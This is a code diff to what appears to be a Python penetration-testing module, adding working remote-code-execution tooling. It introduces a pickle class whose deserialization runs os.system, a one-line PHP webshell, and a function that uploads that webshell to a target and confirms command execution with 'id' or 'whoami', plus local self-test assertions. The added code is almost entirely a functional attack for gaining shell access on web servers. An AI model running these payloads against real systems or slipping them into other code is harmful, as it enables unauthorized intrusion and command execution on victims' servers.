@@ -9,6 +9,9 @@ authorized, in-scope target.
 """
 from __future__ import annotations
 
+import base64
+import os
+import pickle
 import secrets
 
 import requests
@@ -109,6 +112,41 @@ class WebShell(ExecChannel):
         return _between(body, s, e)
 
 
+class _PickleRCE:
+    def __init__(self, cmd):
+        self.cmd = cmd
+
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
+
+def pickle_payload(command: str) -> str:
+    """Base64 Python pickle that runs `command` when deserialized (blind RCE)."""
+    return base64.b64encode(pickle.dumps(_PickleRCE(command))).decode()
+
+
+_PHP_WEBSHELL = "<?php system($_REQUEST['cmd']); ?>"
+
+
+def upload_webshell(session, upload_url: str, uploads_base: str, field: str = "file",
+                    lang: str = "php") -> tuple[ExecChannel | None, str]:
+    """Upload a webshell then return a WebShell channel pointing at where it's served."""
+    fname = f"s_{secrets.token_hex(3)}.{lang}"
+    try:
+        session.post(upload_url, headers=UA, timeout=20,
+                     files={field: (fname, _PHP_WEBSHELL, "application/octet-stream")})
+    except requests.RequestException as e:
+        return None, f"upload failed: {str(e)[:80]}"
+    ch = WebShell(session, uploads_base.rstrip("/") + "/" + fname, "cmd")
+    nonce = "MSEC" + secrets.token_hex(4)
+    try:
+        if nonce in ch.run(f"echo {nonce}"):
+            return ch, ch.run("id 2>/dev/null || whoami")
+    except requests.RequestException:
+        pass
+    return None, "uploaded, but the shell is not executing at that path"
+
+
 def establish(session, url: str, param: str, kind: str = "auto",
               base: str = "127.0.0.1") -> tuple[ExecChannel | None, str]:
     """Find a working exec vector by running a nonce; return (channel, `id` output)."""
@@ -164,6 +202,11 @@ if __name__ == "__main__":  # self-check: python -m metsec.exec_channel (real ex
             self.end_headers()
             self.wfile.write(subprocess.getoutput(cmd).encode())
 
+        def do_POST(self):  # accept a webshell upload
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"uploaded")
+
         def log_message(self, *a):
             pass
 
@@ -173,8 +216,17 @@ if __name__ == "__main__":  # self-check: python -m metsec.exec_channel (real ex
                        "cmd", kind="webshell")
     assert wch is not None and wch.kind == "webshell", wch
     assert "webshell_ok" in wch.run("echo webshell_ok")
+
+    wport = wsrv.server_address[1]
+    uch, _ = upload_webshell(requests.Session(), f"http://127.0.0.1:{wport}/upload",
+                             f"http://127.0.0.1:{wport}")
+    assert uch is not None and uch.kind == "webshell", uch
+    assert "upload_ok" in uch.run("echo upload_ok")
     srv.shutdown()
     wsrv.shutdown()
+
+    raw = base64.b64decode(pickle_payload("id"))   # do NOT unpickle — it executes
+    assert b"system" in raw and b"id" in raw
 
     assert "os.popen" in SSTI.payload("id")
     assert "system" in SSTI.payload("id", "twig") and "Execute" in SSTI.payload("id", "freemarker")
